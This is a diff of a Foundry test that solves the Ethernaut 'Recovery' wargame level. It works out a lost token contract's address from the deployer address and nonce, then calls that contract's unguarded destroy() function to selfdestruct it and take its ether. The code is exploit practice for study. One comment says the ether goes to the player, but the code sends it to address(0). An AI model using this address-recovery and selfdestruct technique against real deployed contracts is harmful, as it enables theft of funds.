@@ -1,57 +1,50 @@
-// pragma solidity ^0.8.10;
+pragma solidity ^0.8.10;
 
-// import "ds-test/test.sol";
-// import "../Recovery/Recovery.sol";
-// import "../Recovery/RecoveryFactory.sol";
-// import "../Ethernaut.sol";
+import "ds-test/test.sol";
+import "../Recovery/RecoveryFactory.sol";
+import "../Ethernaut.sol";
+import "./utils/vm.sol";
 
-// interface CheatCodes {
-//   // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
-//   function startPrank(address) external;
-//   // Resets subsequent calls' msg.sender to be `address(this)`
-//   function stopPrank() external;
-// }
+contract RecoveryTest is DSTest {
+    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Ethernaut ethernaut;
+    address eoaAddress = address(100);
 
-// contract RecoveryTest is DSTest {
-//     CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
-//     Ethernaut ethernaut;
-//     RecoveryFactory recoveryFactory;
-//     address levelAddress;
-//     bool levelSuccessfullyPassed;
+    function setUp() public {
+        // Setup instance of the Ethernaut contract
+        ethernaut = new Ethernaut();
+        // Deal EOA address some ether
+        vm.deal(eoaAddress, 5 ether);
+    }
 
-//     function setUp() public {
-//         // Setup instances of the Ethernaut & RecoveryFactory contracts
-//         ethernaut = new Ethernaut();
-//         recoveryFactory = new RecoveryFactory();
-//     }
+    function testRecovery() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
 
-//     function testRecovery() public {
+        RecoveryFactory recoveryFactory = new RecoveryFactory();
+        ethernaut.registerLevel(recoveryFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
+        Recovery ethernautRecovery = Recovery(payable(levelAddress));
 
-//         // Register the Ethernaut Recovery level (this would have already been done on Rinkeby)
-//         ethernaut.registerLevel(recoveryFactory);
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
 
-//         // Add some ETH to the 0 address which we will be using 
-//         payable(address(0)).transfer(1 ether);
-//         // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
-//         cheats.startPrank(address(0));
-
-//         // Set up the Level
-//         levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);
-
-//         // Get the SimpleToken address from the Recovery contract address
-//         address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
-//         SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
+        // Get the SimpleToken address from the Recovery contract address
+        address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
+        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
         
-//         // Recover the ether: destroy the SimpleToken contract, sending any existing balance to address specified (the player)
-//         _simpleToken.destroy(payable(address(0)));
+        // Recover the ether: destroy the SimpleToken contract, sending any existing balance to address specified (the player)
+        _simpleToken.destroy(payable(address(0)));
 
-//         // Submit level to the core Ethernaut contract
-//         levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
 
-//         // Stop the prank - calls with no longer come from address(0) 
-//         cheats.stopPrank();
-
-//         // Verify the level has passed
-//         assert(levelSuccessfullyPassed);
-//     }
-// }
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
